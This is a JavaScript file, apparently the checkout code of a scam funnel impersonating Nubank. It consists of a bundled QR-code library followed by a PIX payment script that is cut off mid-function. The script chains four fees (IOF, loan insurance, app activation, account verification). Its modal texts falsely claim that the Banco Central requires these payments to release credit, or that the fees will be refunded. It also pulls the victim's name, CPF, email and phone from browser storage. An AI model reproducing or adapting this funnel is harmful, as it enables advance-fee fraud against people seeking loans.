/*__QR_LOCAL__ qrcode-generator (MIT) — QR gerado no navegador, sem depender do api.qrserver.com */
var qrcode=function(){function i(t,r){function a(t,r){g=function(t){for(var r=new Array(t),e=0;e<t;e+=1){r[e]=new Array(t);for(var n=0;n<t;n+=1)r[e][n]=null}return r}(l=4*u+17),e(0,0),e(l-7,0),e(0,l-7),i(),o(),v(t,r),7<=u&&h(t),null==n&&(n=w(u,f,c)),d(n,r)}var u=t,f=y[r],g=null,l=0,n=null,c=[],s={},e=function(t,r){for(var e=-1;e<=7;e+=1)if(!(t+e<=-1||l<=t+e))for(var n=-1;n<=7;n+=1)r+n<=-1||l<=r+n||(g[t+e][r+n]=0<=e&&e<=6&&(0==n||6==n)||0<=n&&n<=6&&(0==e||6==e)||2<=e&&e<=4&&2<=n&&n<=4)},o=function(){for(var t=8;t<l-8;t+=1)null==g[t][6]&&(g[t][6]=t%2==0);for(var r=8;r<l-8;r+=1)null==g[6][r]&&(g[6][r]=r%2==0)},i=function(){for(var t=B.getPatternPosition(u),r=0;r<t.length;r+=1)for(var e=0;e<t.length;e+=1){var n=t[r],o=t[e];if(null==g[n][o])for(var i=-2;i<=2;i+=1)for(var a=-2;a<=2;a+=1)g[n+i][o+a]=-2==i||2==i||-2==a||2==a||0==i&&0==a}},h=function(t){for(var r=B.getBCHTypeNumber(u),e=0;e<18;e+=1){var n=!t&&1==(r>>e&1);g[Math.floor(e/3)][e%3+l-8-3]=n}for(e=0;e<18;e+=1){n=!t&&1==(r>>e&1);g[e%3+l-8-3][Math.floor(e/3)]=n}},v=function(t,r){for(var e=f<<3|r,n=B.getBCHTypeInfo(e),o=0;o<15;o+=1){var i=!t&&1==(n>>o&1);o<6?g[o][8]=i:o<8?g[o+1][8]=i:g[l-15+o][8]=i}for(o=0;o<15;o+=1){i=!t&&1==(n>>o&1);o<8?g[8][l-o-1]=i:o<9?g[8][15-o-1+1]=i:g[8][15-o-1]=i}g[l-8][8]=!t},d=function(t,r){for(var e=-1,n=l-1,o=7,i=0,a=B.getMaskFunction(r),u=l-1;0<u;u-=2)for(6==u&&(u-=1);;){for(var f=0;f<2;f+=1)if(null==g[n][u-f]){var c=!1;i<t.length&&(c=1==(t[i]>>>o&1)),a(n,u-f)&&(c=!c),g[n][u-f]=c,-1==(o-=1)&&(i+=1,o=7)}if((n+=e)<0||l<=n){n-=e,e=-e;break}}},w=function(t,r,e){for(var n=b.getRSBlocks(t,r),o=M(),i=0;i<e.length;i+=1){var a=e[i];o.put(a.getMode(),4),o.put(a.getLength(),B.getLengthInBits(a.getMode(),t)),a.write(o)}var u=0;for(i=0;i<n.length;i+=1)u+=n[i].dataCount;if(o.getLengthInBits()>8*u)throw"code length overflow. ("+o.getLengthInBits()+">"+8*u+")";for(o.getLengthInBits()+4<=8*u&&o.put(0,4);o.getLengthInBits()%8!=0;)o.putBit(!1);for(;!(o.getLengthInBits()>=8*u||(o.put(236,8),o.getLengthInBits()>=8*u));)o.put(17,8);return function(t,r){for(var e=0,n=0,o=0,i=new Array(r.length),a=new Array(r.length),u=0;u<r.length;u+=1){var f=r[u].dataCount,c=r[u].totalCount-f;n=Math.max(n,f),o=Math.max(o,c),i[u]=new Array(f);for(var g=0;g<i[u].length;g+=1)i[u][g]=255&t.getBuffer()[g+e];e+=f;var l=B.getErrorCorrectPolynomial(c),h=C(i[u],l.getLength()-1).mod(l);a[u]=new Array(l.getLength()-1);for(g=0;g<a[u].length;g+=1){var s=g+h.getLength()-a[u].length;a[u][g]=0<=s?h.getAt(s):0}}var v=0;for(g=0;g<r.length;g+=1)v+=r[g].totalCount;var d=new Array(v),w=0;for(g=0;g<n;g+=1)for(u=0;u<r.length;u+=1)g<i[u].length&&(d[w]=i[u][g],w+=1);for(g=0;g<o;g+=1)for(u=0;u<r.length;u+=1)g<a[u].length&&(d[w]=a[u][g],w+=1);return d}(o,n)};s.addData=function(t,r){var e=null;switch(r=r||"Byte"){case"Numeric":e=x(t);break;case"Alphanumeric":e=m(t);break;case"Byte":e=L(t);break;case"Kanji":e=D(t);break;default:throw"mode:"+r}c.push(e),n=null},s.isDark=function(t,r){if(t<0||l<=t||r<0||l<=r)throw t+","+r;return g[t][r]},s.getModuleCount=function(){return l},s.make=function(){if(u<1){for(var t=1;t<40;t++){for(var r=b.getRSBlocks(t,f),e=M(),n=0;n<c.length;n++){var o=c[n];e.put(o.getMode(),4),e.put(o.getLength(),B.getLengthInBits(o.getMode(),t)),o.write(e)}var i=0;for(n=0;n<r.length;n++)i+=r[n].dataCount;if(e.getLengthInBits()<=8*i)break}u=t}a(!1,function(){for(var t=0,r=0,e=0;e<8;e+=1){a(!0,e);var n=B.getLostPoint(s);(0==e||n<t)&&(t=n,r=e)}return r}())},s.createTableTag=function(t,r){t=t||2;var e="";e+='<table style="',e+=" border-width: 0px; border-style: none;",e+=" border-collapse: collapse;",e+=" padding: 0px; margin: "+(r=void 0===r?4*t:r)+"px;",e+='">',e+="<tbody>";for(var n=0;n<s.getModuleCount();n+=1){e+="<tr>";for(var o=0;o<s.getModuleCount();o+=1)e+='<td style="',e+=" border-width: 0px; border-style: none;",e+=" border-collapse: collapse;",e+=" padding: 0px; margin: 0px;",e+=" width: "+t+"px;",e+=" height: "+t+"px;",e+=" background-color: ",e+=s.isDark(n,o)?"#000000":"#ffffff",e+=";",e+='"/>';e+="</tr>"}return e+="</tbody>",e+="</table>"},s.createSvgTag=function(t,r,e,n){var o={};"object"==typeof t&&(t=(o=t).cellSize,r=o.margin,e=o.alt,n=o.title),t=t||2,r=void 0===r?4*t:r,(e="string"==typeof e?{text:e}:e||{}).text=e.text||null,e.id=e.text?e.id||"qrcode-description":null,(n="string"==typeof n?{text:n}:n||{}).text=n.text||null,n.id=n.text?n.id||"qrcode-title":null;var i,a,u,f,c=s.getModuleCount()*t+2*r,g="";for(f="l"+t+",0 0,"+t+" -"+t+",0 0,-"+t+"z ",g+='<svg version="1.1" xmlns="http://www.w3.org/2000/svg"',g+=o.scalable?"":' width="'+c+'px" height="'+c+'px"',g+=' viewBox="0 0 '+c+" "+c+'" ',g+=' preserveAspectRatio="xMinYMin meet"',g+=n.text||e.text?' role="img" aria-labelledby="'+p([n.id,e.id].join(" ").trim())+'"':"",g+=">",g+=n.text?'<title id="'+p(n.id)+'">'+p(n.text)+"</title>":"",g+=e.text?'<description id="'+p(e.id)+'">'+p(e.text)+"</description>":"",g+='<rect width="100%" height="100%" fill="white" cx="0" cy="0"/>',g+='<path d="',a=0;a<s.getModuleCount();a+=1)for(u=a*t+r,i=0;i<s.getModuleCount();i+=1)s.isDark(a,i)&&(g+="M"+(i*t+r)+","+u+f);return g+='" stroke="transparent" fill="black"/>',g+="</svg>"},s.createDataURL=function(o,t){o=o||2,t=void 0===t?4*o:t;var r=s.getModuleCount()*o+2*t,i=t,a=r-t;return I(r,r,function(t,r){if(i<=t&&t<a&&i<=r&&r<a){var e=Math.floor((t-i)/o),n=Math.floor((r-i)/o);return s.isDark(n,e)?0:1}return 1})},s.createImgTag=function(t,r,e){t=t||2,r=void 0===r?4*t:r;var n=s.getModuleCount()*t+2*r,o="";return o+="<img",o+=' src="',o+=s.createDataURL(t,r),o+='"',o+=' width="',o+=n,o+='"',o+=' height="',o+=n,o+='"',e&&(o+=' alt="',o+=p(e),o+='"'),o+="/>"};var p=function(t){for(var r="",e=0;e<t.length;e+=1){var n=t.charAt(e);switch(n){case"<":r+="&lt;";break;case">":r+="&gt;";break;case"&":r+="&amp;";break;case'"':r+="&quot;";break;default:r+=n}}return r};return s.createASCII=function(t,r){if((t=t||1)<2)return function(t){t=void 0===t?2:t;var r,e,n,o,i,a=1*s.getModuleCount()+2*t,u=t,f=a-t,c={"██":"█","█ ":"▀"," █":"▄","  ":" "},g={"██":"▀","█ ":"▀"," █":" ","  ":" "},l="";for(r=0;r<a;r+=2){for(n=Math.floor((r-u)/1),o=Math.floor((r+1-u)/1),e=0;e<a;e+=1)i="█",u<=e&&e<f&&u<=r&&r<f&&s.isDark(n,Math.floor((e-u)/1))&&(i=" "),u<=e&&e<f&&u<=r+1&&r+1<f&&s.isDark(o,Math.floor((e-u)/1))?i+=" ":i+="█",l+=t<1&&f<=r+1?g[i]:c[i];l+="\n"}return a%2&&0<t?l.substring(0,l.length-a-1)+Array(1+a).join("▀"):l.substring(0,l.length-1)}(r);t-=1,r=void 0===r?2*t:r;var e,n,o,i,a=s.getModuleCount()*t+2*r,u=r,f=a-r,c=Array(t+1).join("██"),g=Array(t+1).join("  "),l="",h="";for(e=0;e<a;e+=1){for(o=Math.floor((e-u)/t),h="",n=0;n<a;n+=1)i=1,u<=n&&n<f&&u<=e&&e<f&&s.isDark(o,Math.floor((n-u)/t))&&(i=0),h+=i?c:g;for(o=0;o<t;o+=1)l+=h+"\n"}return l.substring(0,l.length-1)},s.renderTo2dContext=function(t,r){r=r||2;for(var e=s.getModuleCount(),n=0;n<e;n++)for(var o=0;o<e;o++)t.fillStyle=s.isDark(n,o)?"black":"white",t.fillRect(n*r,o*r,r,r)},s}i.stringToBytes=(i.stringToBytesFuncs={default:function(t){for(var r=[],e=0;e<t.length;e+=1){var n=t.charCodeAt(e);r.push(255&n)}return r}}).default,i.createStringToBytes=function(u,f){var i=function(){function t(){var t=r.read();if(-1==t)throw"eof";return t}for(var r=S(u),e=0,n={};;){var o=r.read();if(-1==o)break;var i=t(),a=t()<<8|t();n[String.fromCharCode(o<<8|i)]=a,e+=1}if(e!=f)throw e+" != "+f;return n}(),a="?".charCodeAt(0);return function(t){for(var r=[],e=0;e<t.length;e+=1){var n=t.charCodeAt(e);if(n<128)r.push(n);else{var o=i[t.charAt(e)];"number"==typeof o?(255&o)==o?r.push(o):(r.push(o>>>8),r.push(255&o)):r.push(a)}}return r}};var r,t,a=1,u=2,o=4,f=8,y={L:1,M:0,Q:3,H:2},e=0,n=1,c=2,g=3,l=4,h=5,s=6,v=7,B=(r=[[],[6,18],[6,22],[6,26],[6,30],[6,34],[6,22,38],[6,24,42],[6,26,46],[6,28,50],[6,30,54],[6,32,58],[6,34,62],[6,26,46,66],[6,26,48,70],[6,26,50,74],[6,30,54,78],[6,30,56,82],[6,30,58,86],[6,34,62,90],[6,28,50,72,94],[6,26,50,74,98],[6,30,54,78,102],[6,28,54,80,106],[6,32,58,84,110],[6,30,58,86,114],[6,34,62,90,118],[6,26,50,74,98,122],[6,30,54,78,102,126],[6,26,52,78,104,130],[6,30,56,82,108,134],[6,34,60,86,112,138],[6,30,58,86,114,142],[6,34,62,90,118,146],[6,30,54,78,102,126,150],[6,24,50,76,102,128,154],[6,28,54,80,106,132,158],[6,32,58,84,110,136,162],[6,26,54,82,110,138,166],[6,30,58,86,114,142,170]],(t={}).getBCHTypeInfo=function(t){for(var r=t<<10;0<=d(r)-d(1335);)r^=1335<<d(r)-d(1335);return 21522^(t<<10|r)},t.getBCHTypeNumber=function(t){for(var r=t<<12;0<=d(r)-d(7973);)r^=7973<<d(r)-d(7973);return t<<12|r},t.getPatternPosition=function(t){return r[t-1]},t.getMaskFunction=function(t){switch(t){case e:return function(t,r){return(t+r)%2==0};case n:return function(t,r){return t%2==0};case c:return function(t,r){return r%3==0};case g:return function(t,r){return(t+r)%3==0};case l:return function(t,r){return(Math.floor(t/2)+Math.floor(r/3))%2==0};case h:return function(t,r){return t*r%2+t*r%3==0};case s:return function(t,r){return(t*r%2+t*r%3)%2==0};case v:return function(t,r){return(t*r%3+(t+r)%2)%2==0};default:throw"bad maskPattern:"+t}},t.getErrorCorrectPolynomial=function(t){for(var r=C([1],0),e=0;e<t;e+=1)r=r.multiply(C([1,w.gexp(e)],0));return r},t.getLengthInBits=function(t,r){if(1<=r&&r<10)switch(t){case a:return 10;case u:return 9;case o:case f:return 8;default:throw"mode:"+t}else if(r<27)switch(t){case a:return 12;case u:return 11;case o:return 16;case f:return 10;default:throw"mode:"+t}else{if(!(r<41))throw"type:"+r;switch(t){case a:return 14;case u:return 13;case o:return 16;case f:return 12;default:throw"mode:"+t}}},t.getLostPoint=function(t){for(var r=t.getModuleCount(),e=0,n=0;n<r;n+=1)for(var o=0;o<r;o+=1){for(var i=0,a=t.isDark(n,o),u=-1;u<=1;u+=1)if(!(n+u<0||r<=n+u))for(var f=-1;f<=1;f+=1)o+f<0||r<=o+f||0==u&&0==f||a==t.isDark(n+u,o+f)&&(i+=1);5<i&&(e+=3+i-5)}for(n=0;n<r-1;n+=1)for(o=0;o<r-1;o+=1){var c=0;t.isDark(n,o)&&(c+=1),t.isDark(n+1,o)&&(c+=1),t.isDark(n,o+1)&&(c+=1),t.isDark(n+1,o+1)&&(c+=1),0!=c&&4!=c||(e+=3)}for(n=0;n<r;n+=1)for(o=0;o<r-6;o+=1)t.isDark(n,o)&&!t.isDark(n,o+1)&&t.isDark(n,o+2)&&t.isDark(n,o+3)&&t.isDark(n,o+4)&&!t.isDark(n,o+5)&&t.isDark(n,o+6)&&(e+=40);for(o=0;o<r;o+=1)for(n=0;n<r-6;n+=1)t.isDark(n,o)&&!t.isDark(n+1,o)&&t.isDark(n+2,o)&&t.isDark(n+3,o)&&t.isDark(n+4,o)&&!t.isDark(n+5,o)&&t.isDark(n+6,o)&&(e+=40);var g=0;for(o=0;o<r;o+=1)for(n=0;n<r;n+=1)t.isDark(n,o)&&(g+=1);return e+=Math.abs(100*g/r/r-50)/5*10},t);function d(t){for(var r=0;0!=t;)r+=1,t>>>=1;return r}var w=function(){for(var r=new Array(256),e=new Array(256),t=0;t<8;t+=1)r[t]=1<<t;for(t=8;t<256;t+=1)r[t]=r[t-4]^r[t-5]^r[t-6]^r[t-8];for(t=0;t<255;t+=1)e[r[t]]=t;var n={glog:function(t){if(t<1)throw"glog("+t+")";return e[t]},gexp:function(t){for(;t<0;)t+=255;for(;256<=t;)t-=255;return r[t]}};return n}();function C(n,o){if(void 0===n.length)throw n.length+"/"+o;var r=function(){for(var t=0;t<n.length&&0==n[t];)t+=1;for(var r=new Array(n.length-t+o),e=0;e<n.length-t;e+=1)r[e]=n[e+t];return r}(),i={getAt:function(t){return r[t]},getLength:function(){return r.length},multiply:function(t){for(var r=new Array(i.getLength()+t.getLength()-1),e=0;e<i.getLength();e+=1)for(var n=0;n<t.getLength();n+=1)r[e+n]^=w.gexp(w.glog(i.getAt(e))+w.glog(t.getAt(n)));return C(r,0)},mod:function(t){if(i.getLength()-t.getLength()<0)return i;for(var r=w.glog(i.getAt(0))-w.glog(t.getAt(0)),e=new Array(i.getLength()),n=0;n<i.getLength();n+=1)e[n]=i.getAt(n);for(n=0;n<t.getLength();n+=1)e[n]^=w.gexp(w.glog(t.getAt(n))+r);return C(e,0).mod(t)}};return i}function p(){var e=[],o={writeByte:function(t){e.push(255&t)},writeShort:function(t){o.writeByte(t),o.writeByte(t>>>8)},writeBytes:function(t,r,e){r=r||0,e=e||t.length;for(var n=0;n<e;n+=1)o.writeByte(t[n+r])},writeString:function(t){for(var r=0;r<t.length;r+=1)o.writeByte(t.charCodeAt(r))},toByteArray:function(){return e},toString:function(){var t="";t+="[";for(var r=0;r<e.length;r+=1)0<r&&(t+=","),t+=e[r];return t+="]"}};return o}var k,A,b=(k=[[1,26,19],[1,26,16],[1,26,13],[1,26,9],[1,44,34],[1,44,28],[1,44,22],[1,44,16],[1,70,55],[1,70,44],[2,35,17],[2,35,13],[1,100,80],[2,50,32],[2,50,24],[4,25,9],[1,134,108],[2,67,43],[2,33,15,2,34,16],[2,33,11,2,34,12],[2,86,68],[4,43,27],[4,43,19],[4,43,15],[2,98,78],[4,49,31],[2,32,14,4,33,15],[4,39,13,1,40,14],[2,121,97],[2,60,38,2,61,39],[4,40,18,2,41,19],[4,40,14,2,41,15],[2,146,116],[3,58,36,2,59,37],[4,36,16,4,37,17],[4,36,12,4,37,13],[2,86,68,2,87,69],[4,69,43,1,70,44],[6,43,19,2,44,20],[6,43,15,2,44,16],[4,101,81],[1,80,50,4,81,51],[4,50,22,4,51,23],[3,36,12,8,37,13],[2,116,92,2,117,93],[6,58,36,2,59,37],[4,46,20,6,47,21],[7,42,14,4,43,15],[4,133,107],[8,59,37,1,60,38],[8,44,20,4,45,21],[12,33,11,4,34,12],[3,145,115,1,146,116],[4,64,40,5,65,41],[11,36,16,5,37,17],[11,36,12,5,37,13],[5,109,87,1,110,88],[5,65,41,5,66,42],[5,54,24,7,55,25],[11,36,12,7,37,13],[5,122,98,1,123,99],[7,73,45,3,74,46],[15,43,19,2,44,20],[3,45,15,13,46,16],[1,135,107,5,136,108],[10,74,46,1,75,47],[1,50,22,15,51,23],[2,42,14,17,43,15],[5,150,120,1,151,121],[9,69,43,4,70,44],[17,50,22,1,51,23],[2,42,14,19,43,15],[3,141,113,4,142,114],[3,70,44,11,71,45],[17,47,21,4,48,22],[9,39,13,16,40,14],[3,135,107,5,136,108],[3,67,41,13,68,42],[15,54,24,5,55,25],[15,43,15,10,44,16],[4,144,116,4,145,117],[17,68,42],[17,50,22,6,51,23],[19,46,16,6,47,17],[2,139,111,7,140,112],[17,74,46],[7,54,24,16,55,25],[34,37,13],[4,151,121,5,152,122],[4,75,47,14,76,48],[11,54,24,14,55,25],[16,45,15,14,46,16],[6,147,117,4,148,118],[6,73,45,14,74,46],[11,54,24,16,55,25],[30,46,16,2,47,17],[8,132,106,4,133,107],[8,75,47,13,76,48],[7,54,24,22,55,25],[22,45,15,13,46,16],[10,142,114,2,143,115],[19,74,46,4,75,47],[28,50,22,6,51,23],[33,46,16,4,47,17],[8,152,122,4,153,123],[22,73,45,3,74,46],[8,53,23,26,54,24],[12,45,15,28,46,16],[3,147,117,10,148,118],[3,73,45,23,74,46],[4,54,24,31,55,25],[11,45,15,31,46,16],[7,146,116,7,147,117],[21,73,45,7,74,46],[1,53,23,37,54,24],[19,45,15,26,46,16],[5,145,115,10,146,116],[19,75,47,10,76,48],[15,54,24,25,55,25],[23,45,15,25,46,16],[13,145,115,3,146,116],[2,74,46,29,75,47],[42,54,24,1,55,25],[23,45,15,28,46,16],[17,145,115],[10,74,46,23,75,47],[10,54,24,35,55,25],[19,45,15,35,46,16],[17,145,115,1,146,116],[14,74,46,21,75,47],[29,54,24,19,55,25],[11,45,15,46,46,16],[13,145,115,6,146,116],[14,74,46,23,75,47],[44,54,24,7,55,25],[59,46,16,1,47,17],[12,151,121,7,152,122],[12,75,47,26,76,48],[39,54,24,14,55,25],[22,45,15,41,46,16],[6,151,121,14,152,122],[6,75,47,34,76,48],[46,54,24,10,55,25],[2,45,15,64,46,16],[17,152,122,4,153,123],[29,74,46,14,75,47],[49,54,24,10,55,25],[24,45,15,46,46,16],[4,152,122,18,153,123],[13,74,46,32,75,47],[48,54,24,14,55,25],[42,45,15,32,46,16],[20,147,117,4,148,118],[40,75,47,7,76,48],[43,54,24,22,55,25],[10,45,15,67,46,16],[19,148,118,6,149,119],[18,75,47,31,76,48],[34,54,24,34,55,25],[20,45,15,61,46,16]],(A={}).getRSBlocks=function(t,r){var e=function(t,r){switch(r){case y.L:return k[4*(t-1)+0];case y.M:return k[4*(t-1)+1];case y.Q:return k[4*(t-1)+2];case y.H:return k[4*(t-1)+3];default:return}}(t,r);if(void 0===e)throw"bad rs block @ typeNumber:"+t+"/errorCorrectionLevel:"+r;for(var n,o,i=e.length/3,a=[],u=0;u<i;u+=1)for(var f=e[3*u+0],c=e[3*u+1],g=e[3*u+2],l=0;l<f;l+=1)a.push((n=g,o=void 0,(o={}).totalCount=c,o.dataCount=n,o));return a},A),M=function(){var e=[],n=0,o={getBuffer:function(){return e},getAt:function(t){var r=Math.floor(t/8);return 1==(e[r]>>>7-t%8&1)},put:function(t,r){for(var e=0;e<r;e+=1)o.putBit(1==(t>>>r-e-1&1))},getLengthInBits:function(){return n},putBit:function(t){var r=Math.floor(n/8);e.length<=r&&e.push(0),t&&(e[r]|=128>>>n%8),n+=1}};return o},x=function(t){var r=a,n=t,e={getMode:function(){return r},getLength:function(t){return n.length},write:function(t){for(var r=n,e=0;e+2<r.length;)t.put(o(r.substring(e,e+3)),10),e+=3;e<r.length&&(r.length-e==1?t.put(o(r.substring(e,e+1)),4):r.length-e==2&&t.put(o(r.substring(e,e+2)),7))}},o=function(t){for(var r=0,e=0;e<t.length;e+=1)r=10*r+i(t.charAt(e));return r},i=function(t){if("0"<=t&&t<="9")return t.charCodeAt(0)-"0".charCodeAt(0);throw"illegal char :"+t};return e},m=function(t){var r=u,n=t,e={getMode:function(){return r},getLength:function(t){return n.length},write:function(t){for(var r=n,e=0;e+1<r.length;)t.put(45*o(r.charAt(e))+o(r.charAt(e+1)),11),e+=2;e<r.length&&t.put(o(r.charAt(e)),6)}},o=function(t){if("0"<=t&&t<="9")return t.charCodeAt(0)-"0".charCodeAt(0);if("A"<=t&&t<="Z")return t.charCodeAt(0)-"A".charCodeAt(0)+10;switch(t){case" ":return 36;case"$":return 37;case"%":return 38;case"*":return 39;case"+":return 40;case"-":return 41;case".":return 42;case"/":return 43;case":":return 44;default:throw"illegal char :"+t}};return e},L=function(t){var r=o,e=i.stringToBytes(t),n={getMode:function(){return r},getLength:function(t){return e.length},write:function(t){for(var r=0;r<e.length;r+=1)t.put(e[r],8)}};return n},D=function(t){var r=f,e=i.stringToBytesFuncs.SJIS;if(!e)throw"sjis not supported.";!function(){var t=e("友");if(2!=t.length||38726!=(t[0]<<8|t[1]))throw"sjis not supported."}();var o=e(t),n={getMode:function(){return r},getLength:function(t){return~~(o.length/2)},write:function(t){for(var r=o,e=0;e+1<r.length;){var n=(255&r[e])<<8|255&r[e+1];if(33088<=n&&n<=40956)n-=33088;else{if(!(57408<=n&&n<=60351))throw"illegal char at "+(e+1)+"/"+n;n-=49472}n=192*(n>>>8&255)+(255&n),t.put(n,13),e+=2}if(e<r.length)throw"illegal char at "+(e+1)}};return n},S=function(t){var e=t,n=0,o=0,i=0,r={read:function(){for(;i<8;){if(n>=e.length){if(0==i)return-1;throw"unexpected end of file./"+i}var t=e.charAt(n);if(n+=1,"="==t)return i=0,-1;t.match(/^\s$/)||(o=o<<6|a(t.charCodeAt(0)),i+=6)}var r=o>>>i-8&255;return i-=8,r}},a=function(t){if(65<=t&&t<=90)return t-65;if(97<=t&&t<=122)return t-97+26;if(48<=t&&t<=57)return t-48+52;if(43==t)return 62;if(47==t)return 63;throw"c:"+t};return r},I=function(t,r,e){for(var n=function(t,r){var n=t,o=r,l=new Array(t*r),e={setPixel:function(t,r,e){l[r*n+t]=e},write:function(t){t.writeString("GIF87a"),t.writeShort(n),t.writeShort(o),t.writeByte(128),t.writeByte(0),t.writeByte(0),t.writeByte(0),t.writeByte(0),t.writeByte(0),t.writeByte(255),t.writeByte(255),t.writeByte(255),t.writeString(","),t.writeShort(0),t.writeShort(0),t.writeShort(n),t.writeShort(o),t.writeByte(0);var r=i(2);t.writeByte(2);for(var e=0;255<r.length-e;)t.writeByte(255),t.writeBytes(r,e,255),e+=255;t.writeByte(r.length-e),t.writeBytes(r,e,r.length-e),t.writeByte(0),t.writeString(";")}},i=function(t){for(var r=1<<t,e=1+(1<<t),n=t+1,o=h(),i=0;i<r;i+=1)o.add(String.fromCharCode(i));o.add(String.fromCharCode(r)),o.add(String.fromCharCode(e));var a=p(),u=function(t){var e=t,n=0,o=0,r={write:function(t,r){if(t>>>r!=0)throw"length over";for(;8<=n+r;)e.writeByte(255&(t<<n|o)),r-=8-n,t>>>=8-n,n=o=0;o|=t<<n,n+=r},flush:function(){0<n&&e.writeByte(o)}};return r}(a);u.write(r,n);var f=0,c=String.fromCharCode(l[f]);for(f+=1;f<l.length;){var g=String.fromCharCode(l[f]);f+=1,o.contains(c+g)?c+=g:(u.write(o.indexOf(c),n),o.size()<4095&&(o.size()==1<<n&&(n+=1),o.add(c+g)),c=g)}return u.write(o.indexOf(c),n),u.write(e,n),u.flush(),a.toByteArray()},h=function(){var r={},e=0,n={add:function(t){if(n.contains(t))throw"dup key:"+t;r[t]=e,e+=1},size:function(){return e},indexOf:function(t){return r[t]},contains:function(t){return void 0!==r[t]}};return n};return e}(t,r),o=0;o<r;o+=1)for(var i=0;i<t;i+=1)n.setPixel(i,o,e(i,o));var a=p();n.write(a);for(var u=function(){function e(t){a+=String.fromCharCode(r(63&t))}var n=0,o=0,i=0,a="",t={},r=function(t){if(t<0);else{if(t<26)return 65+t;if(t<52)return t-26+97;if(t<62)return t-52+48;if(62==t)return 43;if(63==t)return 47}throw"n:"+t};return t.writeByte=function(t){for(n=n<<8|255&t,o+=8,i+=1;6<=o;)e(n>>>o-6),o-=6},t.flush=function(){if(0<o&&(e(n<<6-o),o=n=0),i%3!=0)for(var t=3-i%3,r=0;r<t;r+=1)a+="="},t.toString=function(){return a},t}(),f=a.toByteArray(),c=0;c<f.length;c+=1)u.writeByte(f[c]);return u.flush(),"data:image/gif;base64,"+u};return i}();qrcode.stringToBytesFuncs["UTF-8"]=function(t){return function(t){for(var r=[],e=0;e<t.length;e++){var n=t.charCodeAt(e);n<128?r.push(n):n<2048?r.push(192|n>>6,128|63&n):n<55296||57344<=n?r.push(224|n>>12,128|n>>6&63,128|63&n):(e++,n=65536+((1023&n)<<10|1023&t.charCodeAt(e)),r.push(240|n>>18,128|n>>12&63,128|n>>6&63,128|63&n))}return r}(t)},function(t){"function"==typeof define&&define.amd?define([],t):"object"==typeof exports&&(module.exports=t())}(function(){return qrcode});

/* ═══════════════════════════════════════════════════════════════════════════
   Checkout PIX Nubank — modal + geração via /api/pix (Skale) + polling /api/status.
   Ao confirmar o pagamento, avança pro próximo passo do funil.
   ═══════════════════════════════════════════════════════════════════════════ */

// Espelha api/_catalog.js (servidor). O valor real é resolvido lá; aqui é só exibição.
var PIX_PRODUCTS = {
  up1: { price: 19.93, name: 'IOF - Imposto sobre Operações Financeiras' },
  up2: { price: 29.90, name: 'Seguro Prestamista - Tarifa de Cadastro' },
  up3: { price: 19.00, name: 'Tarifa de Ativação do Aplicativo' },
  up4: { price: 50.00, name: 'Taxa de Verificação de Conta' },
};

// Mensagem de cada oferta no modal.
var PIX_MESSAGES = {
  up1: { emoji: '🏦', titulo: 'Pague o IOF e libere seu crédito', sub: 'O Imposto sobre Operações Financeiras é obrigatório pelo Banco Central para autorizar a liberação do valor na sua conta.' },
  up2: { emoji: '🛡️', titulo: 'Contrate o Seguro e libere seu crédito', sub: 'O Seguro Prestamista garante a liberação segura do valor. Pague a taxa única e o crédito é liberado via Pix.' },
  up3: { emoji: '📱', titulo: 'Ative seu aplicativo agora', sub: 'A tarifa de ativação libera o acesso ao app e o valor será reembolsado na sua conta digital.' },
  up4: { emoji: '✅', titulo: 'Confirme a verificação da conta', sub: 'A taxa de verificação valida seus dados e será creditada como saldo disponível na sua conta.' },
};

// Próximo destino do funil por página. up1→up2, up2→up3, up3→up4, up4 encerra (fica).
var NU_NEXT = {
  up1: '/up2',
  up2: '/up3',
  up3: '/up4',
  up4: null,
};

function _nuEid() {
  try {
    var v = localStorage.getItem('_extid');
    if (!v) { v = 'u_' + Date.now().toString(36) + Math.random().toString(36).slice(2, 12); localStorage.setItem('_extid', v); }
    return v;
  } catch (e) { return ''; }
}

// Captura UTMs da URL e guarda (session + local, durável por todo o funil).
(function () {
  var p = new URLSearchParams(window.location.search);
  var keys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'src', 'sck'];
  var fresh = {};
  keys.forEach(function (k) { var v = p.get(k); if (v) fresh[k] = v; });
  if (Object.keys(fresh).length) {
    try { sessionStorage.setItem('_utms', JSON.stringify(fresh)); } catch (e) {}
    try {
      var prev = JSON.parse(localStorage.getItem('_utms') || '{}');
      localStorage.setItem('_utms', JSON.stringify(Object.assign(prev, fresh)));
    } catch (e) { try { localStorage.setItem('_utms', JSON.stringify(fresh)); } catch (e2) {} }
  }
})();

function getUtms() {
  var stored = {}, durable = {};
  try { stored = JSON.parse(sessionStorage.getItem('_utms') || '{}'); } catch (e) {}
  try { durable = JSON.parse(localStorage.getItem('_utms') || '{}'); } catch (e) {}
  function ck(name) {
    var m = document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)');
    return m ? decodeURIComponent(m.pop()) : null;
  }
  var merged = {};
  ['src', 'sck', 'utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content'].forEach(function (k) {
    merged[k] = stored[k] || durable[k] || ck(k) || null;
  });
  return merged;
}

// Lê o cliente que o funil (/01→/02) gravou no localStorage.
function _nuCliente() {
  var nome = '', cpf = '', email = '', phone = '';
  try {
    var du = JSON.parse(localStorage.getItem('dadosUsuario') || '{}');
    nome = du.nome || localStorage.getItem('nomeUsuario') || localStorage.getItem('name') || '';
    cpf = du.cpf || localStorage.getItem('cpfUsuario') || localStorage.getItem('cpf') || '';
    email = localStorage.getItem('email') || '';
    phone = localStorage.getItem('telephone') || localStorage.getItem('telefone') || '';
  } catch (e) {}
  return { nome: nome, cpf: cpf, email: email, phone: phone };
}

/* ─── estado do modal ─── */
var _pixPollInterval = null;
var _pixTimerInterval = null;
var _pixTimerSecs = 900;
var _pixCurrentTxn = null;
var _pixCurrentUpKey = '';
var _pixInFlight = false;

// API pública dos botões das páginas.
function redirect(upKey) { _pixOpenModal(upKey); }
window.redirect = redirect;
// Alias: as páginas originais chamavam redirectToPayment(); reaproveita o upKey da URL.
function redirectToPayment() {
  var m = window.location.pathname.match(/\/(up\d+)/);
  _pixOpenModal(m ? m[1] : 'up1');
}
window.redirectToPayment = redirectToPayment;

function _nuNext(upKey) {
  var dest = (upKey in NU_NEXT) ? NU_NEXT[upKey] : null;
  if (dest === null || dest === undefined) return;
  window.location.href = dest + window.location.search;
}

function _pixOpenModal(upKey) {
  if (!PIX_PRODUCTS[upKey]) upKey = 'up1';
  var modal = document.getElementById('pix-modal');
  if (!modal) return;
